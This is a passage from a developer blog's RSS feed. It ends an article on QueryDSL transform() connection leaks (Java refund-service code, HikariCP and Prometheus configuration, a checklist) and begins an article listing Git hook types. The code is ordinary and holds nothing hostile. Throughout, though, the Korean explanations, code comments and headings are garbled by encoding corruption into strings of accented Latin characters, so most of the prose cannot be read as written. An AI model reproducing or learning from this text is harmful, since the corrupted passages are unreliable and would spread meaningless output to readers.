class="keyword">void</span> <span class="title function_">processRefund</span><span class="params">(Long orderId)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. ì£¼ë¬¸ ì•„ì´í…œ ì¡°íšŒ - transform() ì‚¬ìš©</span></span><br><span class="line">        Map&lt;Long, List&lt;OrderItem&gt;&gt; orderItems = queryFactory</span><br><span class="line">            .selectFrom(orderItem)</span><br><span class="line">            .where(orderItem.orderId.eq(orderId))</span><br><span class="line">            .transform(</span><br><span class="line">                groupBy(orderItem.productId)</span><br><span class="line">                .as(list(orderItem))</span><br><span class="line">            );  <span class="comment">// ì»¤ë„¥ì…˜ ë°˜í™˜ ì•ˆë¨!</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. í™˜ë¶ˆ ì²˜ë¦¬ ë¡œì§</span></span><br><span class="line">        orderItems.forEach((productId, items) -&gt; &#123;</span><br><span class="line">            <span class="comment">// í™˜ë¶ˆ ì²˜ë¦¬...</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. í™˜ë¶ˆ ì´ë ¥ ì €ì¥</span></span><br><span class="line">        saveRefundHistory(orderId, orderItems);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ë¬¸ì œì :</strong></p><ul><li>ë™ì‹œì— ì—¬ëŸ¬ í™˜ë¶ˆ ìš”ì²­ì´ ë“¤ì–´ì˜¤ë©´ ì»¤ë„¥ì…˜ ê³ ê°ˆ</li><li>í™˜ë¶ˆ ì´ë ¥ ì €ì¥ì´ ì‹¤íŒ¨í•˜ëŠ” í˜„ìƒ ë°œìƒ</li></ul><h3 id="ê°œì„ ëœ-ì½”ë“œ"><a href="#ê°œì„ ëœ-ì½”ë“œ" class="headerlink" title="ê°œì„ ëœ ì½”ë“œ"></a>ê°œì„ ëœ ì½”ë“œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefundService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JPAQueryFactory queryFactory;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RefundHistoryRepository refundHistoryRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span>  <span class="comment">// ì¶”ê°€!</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processRefund</span><span class="params">(Long orderId)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. ì£¼ë¬¸ ì•„ì´í…œ ì¡°íšŒ - transform() ì‚¬ìš©í•´ë„ ì•ˆì „</span></span><br><span class="line">        Map&lt;Long, List&lt;OrderItem&gt;&gt; orderItemsByProduct = queryFactory</span><br><span class="line">            .selectFrom(orderItem)</span><br><span class="line">            .where(orderItem.orderId.eq(orderId))</span><br><span class="line">            .transform(</span><br><span class="line">                groupBy(orderItem.productId)</span><br><span class="line">                .as(list(orderItem))</span><br><span class="line">            );  <span class="comment">// ë©”ì„œë“œ ì¢…ë£Œ ì‹œ ì»¤ë„¥ì…˜ ìë™ ë°˜í™˜</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. í™˜ë¶ˆ ì²˜ë¦¬ ë¡œì§</span></span><br><span class="line">        List&lt;RefundHistory&gt; histories = orderItemsByProduct.entrySet()</span><br><span class="line">            .stream()</span><br><span class="line">            .map(entry -&gt; processRefundForProduct(entry.getKey(), entry.getValue()))</span><br><span class="line">            .toList();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. í™˜ë¶ˆ ì´ë ¥ ì¼ê´„ ì €ì¥ (ê°™ì€ íŠ¸ëœì­ì…˜)</span></span><br><span class="line">        refundHistoryRepository.saveAll(histories);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> RefundHistory <span class="title function_">processRefundForProduct</span><span class="params">(Long productId, List&lt;OrderItem&gt; items)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">totalAmount</span> <span class="operator">=</span> items.stream()</span><br><span class="line">            .mapToInt(OrderItem::getAmount)</span><br><span class="line">            .sum();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> RefundHistory.builder()</span><br><span class="line">            .productId(productId)</span><br><span class="line">            .itemCount(items.size())</span><br><span class="line">            .totalAmount(totalAmount)</span><br><span class="line">            .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ê°œì„  íš¨ê³¼:</strong></p><ul><li>ì»¤ë„¥ì…˜ ëˆ„ìˆ˜ ì™„ì „ í•´ê²°</li><li>í™˜ë¶ˆ ì²˜ë¦¬ì™€ ì´ë ¥ ì €ì¥ì´ í•˜ë‚˜ì˜ íŠ¸ëœì­ì…˜ìœ¼ë¡œ ë¬¶ì„</li><li>ì›ìì„± ë³´ì¥ (ì „ì²´ ì„±ê³µ ë˜ëŠ” ì „ì²´ ë¡¤ë°±)</li></ul><h2 id="ëª¨ë‹ˆí„°ë§-ë°-íƒì§€"><a href="#ëª¨ë‹ˆí„°ë§-ë°-íƒì§€" class="headerlink" title="ëª¨ë‹ˆí„°ë§ ë° íƒì§€"></a>ëª¨ë‹ˆí„°ë§ ë° íƒì§€</h2><h3 id="HikariCP-ë©”íŠ¸ë¦­-ì„¤ì •"><a href="#HikariCP-ë©”íŠ¸ë¦­-ì„¤ì •" class="headerlink" title="HikariCP ë©”íŠ¸ë¦­ ì„¤ì •"></a>HikariCP ë©”íŠ¸ë¦­ ì„¤ì •</h3><p>ì»¤ë„¥ì…˜ í’€ ìƒíƒœë¥¼ ëª¨ë‹ˆí„°ë§í•˜ì—¬ ë¬¸ì œë¥¼ ì¡°ê¸°ì— ë°œê²¬:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.yml</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">hikari:</span></span><br><span class="line">      <span class="comment"># ì»¤ë„¥ì…˜ í’€ ì„¤ì •</span></span><br><span class="line">      <span class="attr">maximum-pool-size:</span> <span class="number">20</span></span><br><span class="line">      <span class="attr">minimum-idle:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">connection-timeout:</span> <span class="number">30000</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># ì»¤ë„¥ì…˜ ëˆ„ìˆ˜ íƒì§€</span></span><br><span class="line">      <span class="attr">leak-detection-threshold:</span> <span class="number">60000</span>  <span class="comment"># 60ì´ˆ</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># ë©”íŠ¸ë¦­ í™œì„±í™”</span></span><br><span class="line">      <span class="attr">register-mbeans:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">metrics,</span> <span class="string">health</span></span><br><span class="line">  <span class="attr">metrics:</span></span><br><span class="line">    <span class="attr">export:</span></span><br><span class="line">      <span class="attr">prometheus:</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="ì»¤ë„¥ì…˜-í’€-ìƒíƒœ-ëª¨ë‹ˆí„°ë§"><a href="#ì»¤ë„¥ì…˜-í’€-ìƒíƒœ-ëª¨ë‹ˆí„°ë§" class="headerlink" title="ì»¤ë„¥ì…˜ í’€ ìƒíƒœ ëª¨ë‹ˆí„°ë§"></a>ì»¤ë„¥ì…˜ í’€ ìƒíƒœ ëª¨ë‹ˆí„°ë§</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MonitoringController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> HikariDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/admin/hikari-stats&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getHikariStats</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">HikariPoolMXBean</span> <span class="variable">poolMXBean</span> <span class="operator">=</span> dataSource.getHikariPoolMXBean();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Map.of(</span><br><span class="line">            <span class="string">&quot;activeConnections&quot;</span>, poolMXBean.getActiveConnections(),</span><br><span class="line">            <span class="string">&quot;idleConnections&quot;</span>, poolMXBean.getIdleConnections(),</span><br><span class="line">            <span class="string">&quot;totalConnections&quot;</span>, poolMXBean.getTotalConnections(),</span><br><span class="line">            <span class="string">&quot;threadsAwaitingConnection&quot;</span>, poolMXBean.getThreadsAwaitingConnection()</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ê²½ê³ -ì•Œë¦¼-ì„¤ì •"><a href="#ê²½ê³ -ì•Œë¦¼-ì„¤ì •" class="headerlink" title="ê²½ê³  ì•Œë¦¼ ì„¤ì •"></a>ê²½ê³  ì•Œë¦¼ ì„¤ì •</h3><p>Prometheus + Grafanaë¥¼ ì‚¬ìš©í•œ ì•Œë¦¼ ì„¤ì •:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># prometheus-alert.yml</span></span><br><span class="line"><span class="attr">groups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hikari_connection_pool</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="string">30s</span></span><br><span class="line">    <span class="attr">rules:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">alert:</span> <span class="string">HikariConnectionPoolExhausted</span></span><br><span class="line">        <span class="attr">expr:</span> <span class="string">hikari_pool_total_connections</span> <span class="string">&gt;=</span> <span class="string">hikari_pool_max_connections</span> <span class="string">*</span> <span class="number">0.9</span></span><br><span class="line">        <span class="attr">for:</span> <span class="string">1m</span></span><br><span class="line">        <span class="attr">labels:</span></span><br><span class="line">          <span class="attr">severity:</span> <span class="string">warning</span></span><br><span class="line">        <span class="attr">annotations:</span></span><br><span class="line">          <span class="attr">summary:</span> <span class="string">&quot;HikariCP connection pool nearly exhausted&quot;</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;Pool usage is at <span class="template-variable">&#123;&#123; $value &#125;&#125;</span>%&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">alert:</span> <span class="string">HikariConnectionLeakSuspected</span></span><br><span class="line">        <span class="attr">expr:</span> <span class="string">hikari_pool_active_connections</span> <span class="string">&gt;</span> <span class="number">0</span> <span class="string">and</span> <span class="string">rate(hikari_pool_active_connections[5m])</span> <span class="string">&gt;</span> <span class="number">0</span></span><br><span class="line">        <span class="attr">for:</span> <span class="string">5m</span></span><br><span class="line">        <span class="attr">labels:</span></span><br><span class="line">          <span class="attr">severity:</span> <span class="string">critical</span></span><br><span class="line">        <span class="attr">annotations:</span></span><br><span class="line">          <span class="attr">summary:</span> <span class="string">&quot;Possible connection leak detected&quot;</span></span><br></pre></td></tr></table></figure><h2 id="ì²´í¬ë¦¬ìŠ¤íŠ¸"><a href="#ì²´í¬ë¦¬ìŠ¤íŠ¸" class="headerlink" title="ì²´í¬ë¦¬ìŠ¤íŠ¸"></a>ì²´í¬ë¦¬ìŠ¤íŠ¸</h2><p>QueryDSLì„ ì‚¬ìš©í•  ë•Œ í™•ì¸í•´ì•¼ í•  ì‚¬í•­ë“¤:</p><ul><li><input disabled="" type="checkbox"> <code>transform()</code> ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ëŠ” ëª¨ë“  ë©”ì„œë“œì— <code>@Transactional</code> ì¶”ê°€</li><li><input disabled="" type="checkbox"> <code>readOnly = true</code> ì„¤ì •ìœ¼ë¡œ ì½ê¸° ì „ìš© ëª…ì‹œ</li><li><input disabled="" type="checkbox"> HikariCP leak detection ì„¤ì • í™œì„±í™”</li><li><input disabled="" type="checkbox"> ì»¤ë„¥ì…˜ í’€ ë©”íŠ¸ë¦­ ëª¨ë‹ˆí„°ë§ êµ¬ì„±</li><li><input disabled="" type="checkbox"> ëŒ€ìš©ëŸ‰ ë°ì´í„° ì²˜ë¦¬ ì‹œ í˜ì´ì§• ê³ ë ¤</li><li><input disabled="" type="checkbox"> í…ŒìŠ¤íŠ¸ í™˜ê²½ì—ì„œ ë™ì‹œì„± í…ŒìŠ¤íŠ¸ ìˆ˜í–‰</li></ul><h2 id="êµí›ˆê³¼-ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤"><a href="#êµí›ˆê³¼-ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤" class="headerlink" title="êµí›ˆê³¼ ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤"></a>êµí›ˆê³¼ ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤</h2><h3 id="1-QueryDSL-ë©”ì„œë“œ-ì´í•´"><a href="#1-QueryDSL-ë©”ì„œë“œ-ì´í•´" class="headerlink" title="1. QueryDSL ë©”ì„œë“œ ì´í•´"></a>1. QueryDSL ë©”ì„œë“œ ì´í•´</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// âœ… ì•ˆì „ - ìë™ ë¦¬ì†ŒìŠ¤ ì •ë¦¬</span></span><br><span class="line">queryFactory.selectFrom(entity).fetch()</span><br><span class="line">queryFactory.selectFrom(entity).fetchOne()</span><br><span class="line">queryFactory.selectFrom(entity).fetchFirst()</span><br><span class="line"></span><br><span class="line"><span class="comment">// âš ï¸ ì£¼ì˜ í•„ìš” - @Transactional í•„ìˆ˜</span></span><br><span class="line">queryFactory.selectFrom(entity).transform(...)</span><br><span class="line">queryFactory.selectFrom(entity).iterate()</span><br></pre></td></tr></table></figure><h3 id="2-íŠ¸ëœì­ì…˜-ê²½ê³„-ëª…í™•íˆ"><a href="#2-íŠ¸ëœì­ì…˜-ê²½ê³„-ëª…í™•íˆ" class="headerlink" title="2. íŠ¸ëœì­ì…˜ ê²½ê³„ ëª…í™•íˆ"></a>2. íŠ¸ëœì­ì…˜ ê²½ê³„ ëª…í™•íˆ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// âŒ ë‚˜ìœ ì˜ˆ</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">someMethod</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// íŠ¸ëœì­ì…˜ ì—†ì´ transform() ì‚¬ìš©</span></span><br><span class="line">    Map&lt;Long, List&lt;Entity&gt;&gt; map = queryFactory</span><br><span class="line">        .selectFrom(entity)</span><br><span class="line">        .transform(groupBy(entity.id).as(list(entity)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// âœ… ì¢‹ì€ ì˜ˆ</span></span><br><span class="line"><span class="meta">@Transactional(readOnly = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">someMethod</span><span class="params">()</span> &#123;</span><br><span class="line">    Map&lt;Long, List&lt;Entity&gt;&gt; map = queryFactory</span><br><span class="line">        .selectFrom(entity)</span><br><span class="line">        .transform(groupBy(entity.id).as(list(entity)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ì ì ˆí•œ-ì»¤ë„¥ì…˜-í’€-í¬ê¸°-ì„¤ì •"><a href="#3-ì ì ˆí•œ-ì»¤ë„¥ì…˜-í’€-í¬ê¸°-ì„¤ì •" class="headerlink" title="3. ì ì ˆí•œ ì»¤ë„¥ì…˜ í’€ í¬ê¸° ì„¤ì •"></a>3. ì ì ˆí•œ ì»¤ë„¥ì…˜ í’€ í¬ê¸° ì„¤ì •</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HikariCP ê¶Œì¥ ê³µì‹</span></span><br><span class="line">connections = ((core_count * <span class="number">2</span>) + effective_spindle_count)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì˜ˆì‹œ: 4ì½”ì–´ CPU, SSD ì‚¬ìš©</span></span><br><span class="line"><span class="comment">// connections = (4 * 2) + 1 = 9</span></span><br><span class="line"><span class="comment">// ì—¬ìœ ë¥¼ ë‘ì–´ 10~20 ì„¤ì •</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">hikari:</span></span><br><span class="line">      <span class="attr">maximum-pool-size:</span> <span class="number">20</span></span><br><span class="line">      <span class="attr">minimum-idle:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><h3 id="4-í˜ì´ì§•-ì²˜ë¦¬"><a href="#4-í˜ì´ì§•-ì²˜ë¦¬" class="headerlink" title="4. í˜ì´ì§• ì²˜ë¦¬"></a>4. í˜ì´ì§• ì²˜ë¦¬</h3><p>ëŒ€ìš©ëŸ‰ ë°ì´í„°ë¥¼ ì²˜ë¦¬í•  ë•ŒëŠ” í˜ì´ì§• ê³ ë ¤:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional(readOnly = true)</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;Long, List&lt;OrderItem&gt;&gt; <span class="title function_">getOrderItemsByOrderIdWithPaging</span><span class="params">(</span></span><br><span class="line"><span class="params">    List&lt;Long&gt; orderIds,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> pageSize</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    Map&lt;Long, List&lt;OrderItem&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; orderIds.size(); i += pageSize) &#123;</span><br><span class="line">        List&lt;Long&gt; batch = orderIds.subList(</span><br><span class="line">            i,</span><br><span class="line">            Math.min(i + pageSize, orderIds.size())</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Map&lt;Long, List&lt;OrderItem&gt;&gt; batchResult = queryFactory</span><br><span class="line">            .selectFrom(orderItem)</span><br><span class="line">            .where(orderItem.orderId.in(batch))</span><br><span class="line">            .transform(groupBy(orderItem.orderId).as(list(orderItem)));</span><br><span class="line"></span><br><span class="line">        result.putAll(batchResult);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Spring/">Spring</category>
      
      <category domain="https://ckck803.github.io/categories/Spring/QueryDSL/">QueryDSL</category>
      
      <category domain="https://ckck803.github.io/categories/Spring/QueryDSL/JPA/">JPA</category>
      
      
      
      <comments>https://ckck803.github.io/2025/12/25/spring/querydsl-transform-connection-leak/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Git - Git Hookìœ¼ë¡œ ì›Œí¬í”Œë¡œìš° ìë™í™”í•˜ê¸°</title>
      <link>https://ckck803.github.io/2025/12/22/git/git-hooks/</link>
      <guid>https://ckck803.github.io/2025/12/22/git/git-hooks/</guid>
      <pubDate>Sun, 21 Dec 2025 16:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/git/git.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Git-Hookì´ë€&quot;&gt;&lt;a href=&quot;#Git-Hookì´ë€&quot; class=&quot;headerlink&quot; title=&quot;Git Hookì´ë€?&quot;&gt;&lt;/a&gt;Git Hookì´ë€?&lt;/h2&gt;&lt;p&gt;Git Hookì€ Gitì—ì„œ íŠ¹ì • ì´ë²¤íŠ¸ê°€ ë°œìƒí–ˆì„ ë•Œ ìë™ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤. ì»¤ë°‹, í‘¸ì‹œ, ë¨¸ì§€ ë“±ì˜ ì‘ì—… ì „í›„ì— ì‚¬ìš©ì ì •ì˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì—¬ ì½”ë“œ í’ˆì§ˆ ê²€ì‚¬, í…ŒìŠ¤íŠ¸ ìë™í™”, ë©”ì‹œì§€ ê²€ì¦ ë“± ë‹¤ì–‘í•œ ì›Œí¬í”Œë¡œìš°ë¥¼ ìë™í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;Git-Hookì˜-ì¢…ë¥˜&quot;&gt;&lt;a href=&quot;#Git-Hookì˜-ì¢…ë¥˜&quot; class=&quot;headerlink&quot; title=&quot;Git Hookì˜ ì¢…ë¥˜&quot;&gt;&lt;/a&gt;Git Hookì˜ ì¢…ë¥˜&lt;/h2&gt;&lt;p&gt;Git Hookì€ í¬ê²Œ &lt;strong&gt;í´ë¼ì´ì–¸íŠ¸ í›…(Client-side Hooks)&lt;/strong&gt; ê³¼ &lt;strong&gt;ì„œë²„ í›…(Server-side Hooks)&lt;/strong&gt; ìœ¼ë¡œ ë‚˜ë‰©ë‹ˆë‹¤.&lt;/p&gt;
&lt;h3 id=&quot;í´ë¼ì´ì–¸íŠ¸-í›…-Client-side-Hooks&quot;&gt;&lt;a href=&quot;#í´ë¼ì´ì–¸íŠ¸-í›…-Client-side-Hooks&quot; class=&quot;headerlink&quot; title=&quot;í´ë¼ì´ì–¸íŠ¸ í›… (Client-side Hooks)&quot;&gt;&lt;/a&gt;í´ë¼ì´ì–¸íŠ¸ í›… (Client-side Hooks)&lt;/h3&gt;&lt;p&gt;ê°œë°œìì˜ ë¡œì»¬ ì €ì¥ì†Œì—ì„œ ì‹¤í–‰ë˜ëŠ” í›…ì…ë‹ˆë‹¤.&lt;/p&gt;
&lt;h4 id=&quot;Commit-ê´€ë ¨-í›…&quot;&gt;&lt;a href=&quot;#Commit-ê´€ë ¨-í›…&quot; class=&quot;headerlink&quot; title=&quot;Commit ê´€ë ¨ í›…&quot;&gt;&lt;/a&gt;Commit ê´€ë ¨ í›…&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;pre-commit&lt;/strong&gt;: ì»¤ë°‹ ë©”ì‹œì§€ ì‘ì„± ì „ ì‹¤í–‰ (ì½”ë“œ ë¦°íŠ¸, í…ŒìŠ¤íŠ¸ ì‹¤í–‰)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;prepare-commit-msg&lt;/strong&gt;: ì»¤ë°‹ ë©”ì‹œì§€ ì—ë””í„°ê°€ ì—´ë¦¬ê¸° ì „ ì‹¤í–‰ (ë©”ì‹œì§€ í…œí”Œë¦¿ ì„¤ì •)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;commit-msg&lt;/strong&gt;: ì»¤ë°‹ ë©”ì‹œì§€ ê²€ì¦ (ë©”ì‹œì§€ í˜•ì‹ í™•ì¸)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;post-commit&lt;/strong&gt;: ì»¤ë°‹ì´ ì™„ë£Œëœ í›„ ì‹¤í–‰ (ì•Œë¦¼ ì „ì†¡)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;Merge-Rebase-ê´€ë ¨-í›…&quot;&gt;&lt;a href=&quot;#Merge-Rebase-ê´€ë ¨-í›…&quot; class=&quot;headerlink&quot; title=&quot;Merge&amp;#x2F;Rebase ê´€ë ¨ í›…&quot;&gt;&lt;/a&gt;Merge&amp;#x2F;Rebase ê´€ë ¨ í›…&lt;/h4&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/git/git.png"></p><h2 id="Git-Hookì´ë€"><a href="#Git-Hookì´ë€" class="headerlink" title="Git Hookì´ë€?"></a>Git Hookì´ë€?</h2><p>Git Hookì€ Gitì—ì„œ íŠ¹ì • ì´ë²¤íŠ¸ê°€ ë°œìƒí–ˆì„ ë•Œ ìë™ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤. ì»¤ë°‹, í‘¸ì‹œ, ë¨¸ì§€ ë“±ì˜ ì‘ì—… ì „í›„ì— ì‚¬ìš©ì ì •ì˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì—¬ ì½”ë“œ í’ˆì§ˆ ê²€ì‚¬, í…ŒìŠ¤íŠ¸ ìë™í™”, ë©”ì‹œì§€ ê²€ì¦ ë“± ë‹¤ì–‘í•œ ì›Œí¬í”Œë¡œìš°ë¥¼ ìë™í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Git-Hookì˜-ì¢…ë¥˜"><a href="#Git-Hookì˜-ì¢…ë¥˜" class="headerlink" title="Git Hookì˜ ì¢…ë¥˜"></a>Git Hookì˜ ì¢…ë¥˜</h2><p>Git Hookì€ í¬ê²Œ <strong>í´ë¼ì´ì–¸íŠ¸ í›…(Client-side Hooks)</strong> ê³¼ <strong>ì„œë²„ í›…(Server-side Hooks)</strong> ìœ¼ë¡œ ë‚˜ë‰©ë‹ˆë‹¤.</p><h3 id="í´ë¼ì´ì–¸íŠ¸-í›…-Client-side-Hooks"><a href="#í´ë¼ì´ì–¸íŠ¸-í›…-Client-side-Hooks" class="headerlink" title="í´ë¼ì´ì–¸íŠ¸ í›… (Client-side Hooks)"></a>í´ë¼ì´ì–¸íŠ¸ í›… (Client-side Hooks)</h3><p>ê°œë°œìì˜ ë¡œì»¬ ì €ì¥ì†Œì—ì„œ ì‹¤í–‰ë˜ëŠ” í›…ì…ë‹ˆë‹¤.</p><h4 id="Commit-ê´€ë ¨-í›…"><a href="#Commit-ê´€ë ¨-í›…" class="headerlink" title="Commit ê´€ë ¨ í›…"></a>Commit ê´€ë ¨ í›…</h4><ul><li><strong>pre-commit</strong>: ì»¤ë°‹ ë©”ì‹œì§€ ì‘ì„± ì „ ì‹¤í–‰ (ì½”ë“œ ë¦°íŠ¸, í…ŒìŠ¤íŠ¸ ì‹¤í–‰)</li><li><strong>prepare-commit-msg</strong>: ì»¤ë°‹ ë©”ì‹œì§€ ì—ë””í„°ê°€ ì—´ë¦¬ê¸° ì „ ì‹¤í–‰ (ë©”ì‹œì§€ í…œí”Œë¦¿ ì„¤ì •)</li><li><strong>commit-msg</strong>: ì»¤ë°‹ ë©”ì‹œì§€ ê²€ì¦ (ë©”ì‹œì§€ í˜•ì‹ í™•ì¸)</li><li><strong>post-commit</strong>: ì»¤ë°‹ì´ ì™„ë£Œëœ í›„ ì‹¤í–‰ (ì•Œë¦¼ ì „ì†¡)</li></ul><h4 id="Merge-Rebase-ê´€ë ¨-í›…"><a href="#Merge-Rebase-ê´€ë ¨-í›…" class="headerlink" title="Merge&#x2F;Rebase ê´€ë ¨ í›…"></a>Merge&#x2F;Rebase ê´€ë ¨ í›…</h4><ul><li><strong>pre-merge-commit</strong>: ë¨¸ì§€ ì»¤ë°‹ ìƒì„± ì „ ì‹¤í–‰</li><li><strong>post-merge</strong>: ë¨¸ì§€ê°€ ì™„ë£Œëœ í›„ ì‹¤í–‰ (ì˜ì¡´ì„± ì—…ë°ì´íŠ¸)</li><li><strong>pre-rebase</strong>: ë¦¬ë² ì´ìŠ¤ ì „ ì‹¤í–‰</li></ul><h4 id="Push-ê´€ë ¨-í›…"><a href="#Push-ê´€ë ¨-í›…" class="headerlink" title="Push ê´€ë ¨ í›…"></a>Push ê´€ë ¨ í›…</h4><ul><li><strong>pre-push</strong>: í‘¸ì‹œ ì „ ì‹¤í–‰ (ì›ê²© ì €ì¥ì†Œ ì—…ë°ì´íŠ¸ ì „ ê²€ì¦)</li></ul><h4 id="ê¸°íƒ€-í›…"><a href="#ê¸°íƒ€-í›…" class="headerlink" title="ê¸°íƒ€ í›…"></a>ê¸°íƒ€ í›…</h4><ul><li><strong>pre-auto-gc</strong>: Gitì˜ ìë™ ê°€ë¹„ì§€ ì»¬ë ‰ì…˜ ì „ ì‹¤í–‰</li><li><strong>post-checkout</strong>: ë¸Œëœì¹˜ ì²´í¬ì•„ì›ƒ í›„ ì‹¤í–‰</li><li><strong>post-rewrite</strong>: ì»¤ë°‹ì„ ì¬ì‘ì„±í•˜ëŠ” ëª…ë ¹ í›„ ì‹¤í–‰</li></ul><h3 id="ì„œë²„-í›…-Server-side-Hooks"><a href="#ì„œë²„-í›…-Server-side-Hooks" class="headerlink" title="ì„œë²„ í›… (Server-side Hooks)"></a>ì„œë²„ í›… (Server-side Hooks)</h3><p>ì›ê²© ì €ì¥ì†Œ(ì„œë²„)ì—ì„œ ì‹¤í–‰ë˜ëŠ” í›…ì…ë‹ˆë‹¤.</p><ul><li><strong>pre-receive</strong>: í‘¸ì‹œë¥¼ ë°›ê¸° ì „ ì‹¤í–‰ (í‘¸ì‹œ ê±°ë¶€ ê°€ëŠ¥)</li><li><strong>update</strong>: ê° ë¸Œëœì¹˜ë³„ë¡œ ì‹¤í–‰ (ë¸Œëœì¹˜ ë‹¨ìœ„ ê²€ì¦)</li><li><strong>post-receive</strong>: í‘¸ì‹œê°€ ì™„ë£Œëœ í›„ ì‹¤í–‰ (ë°°í¬, 